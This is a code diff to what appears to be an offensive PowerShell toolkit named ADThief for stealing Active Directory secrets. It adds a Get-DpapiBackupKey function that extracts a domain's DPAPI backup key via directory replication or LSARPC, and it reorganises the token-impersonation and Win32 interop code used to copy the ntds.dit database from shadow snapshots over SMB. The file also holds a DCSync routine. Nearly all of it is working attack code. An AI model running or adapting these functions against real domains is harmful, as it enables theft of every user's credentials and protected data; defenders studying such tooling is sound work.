@@ -13,7 +13,7 @@ Function Invoke-DCSync {
 
 .NOTES
     DSInternals powershell module must be installed first:
-    PS C:\> Install-Module -Name DSInternals
+    PS C:\> Install-Module -Name DSInternals -Scope CurrentUser
 
 .PARAMETER Server
     Specifies the target domain controller.
@@ -105,6 +105,123 @@ Function Invoke-DCSync {
     }
 }
 
+Function Get-DpapiBackupKey {
+<#
+.SYNOPSIS
+    Get the DPAPI backup key from an Active Directory domain controller.
+
+    Author: Timothee MENOCHET (@_tmenochet)
+
+.DESCRIPTION
+    Get-DpapiBackupKey retrieves the DPAPI backup key through various methods and saved it to the local file system.
+
+.NOTES
+    DSInternals powershell module must be installed first:
+    PS C:\> Install-Module -Name DSInternals -Scope CurrentUser
+
+.PARAMETER Server
+    Specifies the target domain controller.
+
+.PARAMETER Credential
+    Specifies the privileged account to use (typically Domain Admin).
+
+.PARAMETER Method
+    Specifies the method to use, defaults to 'MS-DRSR'.
+
+.PARAMETER TargetDirectory
+    Specifies the target directory for local copy.
+
+.EXAMPLE
+    PS C:\> Get-DpapiBackupKey -TargetDirectory $Env:TEMP
+
+.EXAMPLE
+    PS C:\> Get-DpapiBackupKey -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -Method MS-LSAD
+#>
+
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $env:LOGONSERVER,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateSet('MS-DRSR', 'MS-LSAD')]
+        [String]
+        $Method = 'MS-DRSR',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TargetDirectory = "."
+    )
+
+    Begin {
+        # Check if DSInternals module is installed
+        if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
+            Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
+            Write-Warning "Please run command 'Install-Module -Name DSInternals -Scope CurrentUser' first"
+            return
+        }
+        else {
+            Import-Module DSInternals
+        }
+    }
+
+    Process {
+        if ($Method -eq 'MS-DRSR') {
+            # Use MS-DRSR protocol aka directory replication
+            try {
+                # Retrieve the DNS name of the target Active Directory domain
+                $searchString = "LDAP://$Server/RootDSE"
+                $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
+                $defaultNC = $rootDSE.defaultNamingContext[0]
+                $adsPath = "LDAP://$Server/$defaultNC"
+                $domain = $defaultNC -replace 'DC=' -replace ',','.'
+            }
+            catch {
+                Write-Error "Domain controller unreachable" -ErrorAction Stop
+            }
+            try {
+                if ($Credential.UserName) {
+                    $backupKey = Get-ADReplBackupKey -Server $Server -Domain $domain -Protocol TCP -Credential $Credential
+                }
+                else {
+                    $backupKey = Get-ADReplBackupKey -Server $Server -Domain $domain -Protocol TCP
+                }
+            }
+            catch {
+                Write-Error $_ -ErrorAction Stop
+            }
+        }
+        else {
+            # Use MS-LSAD protocol aka LSARPC
+            if ($Credential.Username) {
+                $logonToken = Invoke-UserImpersonation -Credential $Credential
+            }
+            try {
+                $backupKey = Get-LsaBackupKey -ComputerName $Server
+            }
+            catch {
+                Write-Error $_ -ErrorAction Stop
+            }
+        }
+
+        $backupKey = $backupKey | Where-Object {$_.Type -eq 'RSAKey'}
+        $backupKey | Save-DPAPIBlob -DirectoryPath $TargetDirectory
+        Remove-Item kiwiscript.txt
+        Write-Output $backupKey
+    }
+
+    End {
+        if ($logonToken) {
+            Invoke-RevertToSelf -TokenHandle $logonToken
+        }
+    }
+}
+
 Function Get-ADDatabase {
 <#
 .SYNOPSIS
@@ -174,69 +291,6 @@ Function Get-ADDatabase {
             $cimSession = New-CimSession -ComputerName $Server -SessionOption $cimOption -ErrorAction Stop
             if ($Protocol -eq 'Wsman') {
                 $psSession = New-PSSession -ComputerName $Server -SessionOption $psOption
-            }
-        }
-
-        # Adapted from PowerView by @harmj0y and @mattifestation
-        Function Local:Invoke-UserImpersonation {
-            [OutputType([IntPtr])]
-            [CmdletBinding(DefaultParameterSetName = 'Credential')]
-            Param(
-                [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
-                [Management.Automation.PSCredential]
-                [Management.Automation.CredentialAttribute()]
-                $Credential,
-
-                [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
-                [ValidateNotNull()]
-                [IntPtr]
-                $TokenHandle,
-
-                [Switch]
-                $Quiet
-            )
-
-            if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
-                Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
-            }
-
-            if ($PSBoundParameters['TokenHandle']) {
-                $LogonTokenHandle = $TokenHandle
-            }
-            else {
-                $LogonTokenHandle = [IntPtr]::Zero
-                $NetworkCredential = $Credential.GetNetworkCredential()
-                $UserDomain = $NetworkCredential.Domain
-                $UserName = $NetworkCredential.UserName
-                Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
-
-                if (-not [Win32]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
-                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                    throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
-                }
-            }
-
-            if (-not [Win32]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
-                throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
-            }
-            $LogonTokenHandle
-        }
-
-        Function Local:Invoke-RevertToSelf {
-            [CmdletBinding()]
-            Param(
-                [ValidateNotNull()]
-                [IntPtr]
-                $TokenHandle
-            )
-
-            if ($PSBoundParameters['TokenHandle']) {
-                Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
-                [Win32]::CloseHandle($TokenHandle) | Out-Null
-            }
-            if (-not [Win32]::RevertToSelf()) {
-                $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
             }
         }
     }
@@ -318,7 +372,7 @@ Function Get-ADDatabase {
             else {
                 # Adapted from https://gist.github.com/jborean93/f60da33b08f8e1d5e0ef545b0a4698a0
                 # Create a SafeFileHandle of the UNC path
-                $handle = [Win32]::CreateFileW(
+                $handle = [ADThief.Win32]::CreateFileW(
                     "\\$Server\$($ditDrive -Replace ':','$')",
                     [Security.AccessControl.FileSystemRights]"ListDirectory",
                     [IO.FileShare]::ReadWrite,
@@ -331,11 +385,11 @@ Function Get-ADDatabase {
                     Write-Error -Message "CreateFileW failed"
                 }
                 # Invoke NtFsControlFile to access the snapshots
-                $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
+                $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][ADThief.Win32+NT_Trans_Data])
                 $bufferSize = $transDataSize + 4
                 $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
-                $ioBlock = New-Object -TypeName Win32+IO_STATUS_BLOCK
-                [Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
+                $ioBlock = New-Object -TypeName ADThief.Win32+IO_STATUS_BLOCK
+                [ADThief.Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
 
                 # Download files via SMB
                 $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
@@ -373,7 +427,7 @@ Function Get-ADDatabase {
                 }
                 else {
                     # Create a SafeFileHandle of the UNC path
-                    $handle = [Win32]::CreateFileW(
+                    $handle = [ADThief.Win32]::CreateFileW(
                         "\\$Server\C$",
                         [Security.AccessControl.FileSystemRights]"ListDirectory",
                         [IO.FileShare]::ReadWrite,
@@ -386,11 +440,11 @@ Function Get-ADDatabase {
                         Write-Error -Message "CreateFileW failed"
                     }
                     # Invoke NtFsControlFile to access the snapshots
-                    $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][Win32+NT_Trans_Data])
+                    $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][ADThief.Win32+NT_Trans_Data])
                     $bufferSize = $transDataSize + 4
                     $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
-                    $ioBlock = New-Object -TypeName Win32+IO_STATUS_BLOCK
-                    [Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
+                    $ioBlock = New-Object -TypeName ADThief.Win32+IO_STATUS_BLOCK
+                    [ADThief.Win32]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
                 }
             }
 
@@ -679,6 +733,69 @@ Function Invoke-LdapSearch {
     }
 }
 
+# Adapted from PowerView by @harmj0y and @mattifestation
+Function Local:Invoke-UserImpersonation {
+    [OutputType([IntPtr])]
+    [CmdletBinding(DefaultParameterSetName = 'Credential')]
+    Param(
+        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential,
+
+        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle,
+
+        [Switch]
+        $Quiet
+    )
+
+    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+    }
+
+    if ($PSBoundParameters['TokenHandle']) {
+        $LogonTokenHandle = $TokenHandle
+    }
+    else {
+        $LogonTokenHandle = [IntPtr]::Zero
+        $NetworkCredential = $Credential.GetNetworkCredential()
+        $UserDomain = $NetworkCredential.Domain
+        $UserName = $NetworkCredential.UserName
+        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+        if (-not [ADThief.Win32]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
+            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        }
+    }
+
+    if (-not [ADThief.Win32]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
+        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+    $LogonTokenHandle
+}
+
+Function Local:Invoke-RevertToSelf {
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle
+    )
+
+    if ($PSBoundParameters['TokenHandle']) {
+        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        [ADThief.Win32]::CloseHandle($TokenHandle) | Out-Null
+    }
+    if (-not [ADThief.Win32]::RevertToSelf()) {
+        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+}
+
 Add-Type -TypeDefinition @"
 using Microsoft.Win32.SafeHandles;
 using System;
@@ -686,57 +803,59 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
 
-public class Win32
-{
-    [StructLayout(LayoutKind.Sequential)]
-    public struct IO_STATUS_BLOCK
+namespace ADThief {
+    public class Win32
     {
-        public UInt32 Status;
-        public UInt32 Information;
-    }
-    [StructLayout(LayoutKind.Sequential)]
-    public struct NT_Trans_Data
-    {
-        public UInt32 NumberOfSnapShots;
-        public UInt32 NumberOfSnapShotsReturned;
-        public UInt32 SnapShotArraySize;
-    }
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    public static extern SafeFileHandle CreateFileW(
-        string lpFileName,
-        FileSystemRights dwDesiredAccess,
-        FileShare dwShareMode,
-        IntPtr lpSecurityAttributes,
-        FileMode dwCreationDisposition,
-        UInt32 dwFlagsAndAttributes,
-        IntPtr hTemplateFile);
-    [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    public static extern UInt32 NtFsControlFile(
-        SafeFileHandle hDevice,
-        IntPtr Event,
-        IntPtr ApcRoutine,
-        IntPtr ApcContext,
-        ref IO_STATUS_BLOCK IoStatusBlock,
-        UInt32 FsControlCode,
-        IntPtr InputBuffer,
-        UInt32 InputBufferLength,
-        IntPtr OutputBuffer,
-        UInt32 OutputBufferLength);
+        [StructLayout(LayoutKind.Sequential)]
+        public struct IO_STATUS_BLOCK
+        {
+            public UInt32 Status;
+            public UInt32 Information;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct NT_Trans_Data
+        {
+            public UInt32 NumberOfSnapShots;
+            public UInt32 NumberOfSnapShotsReturned;
+            public UInt32 SnapShotArraySize;
+        }
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern SafeFileHandle CreateFileW(
+            string lpFileName,
+            FileSystemRights dwDesiredAccess,
+            FileShare dwShareMode,
+            IntPtr lpSecurityAttributes,
+            FileMode dwCreationDisposition,
+            UInt32 dwFlagsAndAttributes,
+            IntPtr hTemplateFile);
+        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern UInt32 NtFsControlFile(
+            SafeFileHandle hDevice,
+            IntPtr Event,
+            IntPtr ApcRoutine,
+            IntPtr ApcContext,
+            ref IO_STATUS_BLOCK IoStatusBlock,
+            UInt32 FsControlCode,
+            IntPtr InputBuffer,
+            UInt32 InputBufferLength,
+            IntPtr OutputBuffer,
+            UInt32 OutputBufferLength);
 
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool LogonUserA(
-        string lpszUserName, 
-        string lpszDomain,
-        string lpszPassword,
-        int dwLogonType, 
-        int dwLogonProvider,
-        ref IntPtr  phToken
-    );
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool RevertToSelf();
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool CloseHandle(IntPtr hObject);
+        [DllImport("advapi32.dll", SetLastError=true)]
+        public static extern bool LogonUserA(
+            string lpszUserName, 
+            string lpszDomain,
+            string lpszPassword,
+            int dwLogonType, 
+            int dwLogonProvider,
+            ref IntPtr  phToken
+        );
+        [DllImport("advapi32.dll", SetLastError=true)]
+        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+        [DllImport("advapi32.dll", SetLastError=true)]
+        public static extern bool RevertToSelf();
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
 }
 "@
